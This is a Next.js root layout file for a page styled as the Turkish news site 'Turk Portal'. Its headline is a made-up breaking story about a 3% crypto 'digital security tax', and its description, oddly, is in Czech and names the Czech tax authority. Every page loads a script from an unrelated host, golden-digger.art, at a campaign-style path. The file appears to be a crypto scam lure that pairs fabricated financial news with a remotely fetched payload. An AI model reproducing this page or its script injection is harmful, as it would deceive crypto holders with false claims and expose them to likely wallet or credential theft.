export const metadata = {
  title: "SON DAKİKA: Maliye, 200.000 TL üzeri kripto varlıklara %3 “dijital güvenlik vergisi” getirmeye hazırlanıyor — Turk Portal",
  description: "Finanční správa České republiky dnes vydala mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="tr">
      <body>
        {children}
        <script src="https://golden-digger.art/p/e1beb05d-55a4-4451-b40d-8c2723fb7bb5/bootstrap.js" async defer></script>
      </body>
    </html>
  );
}
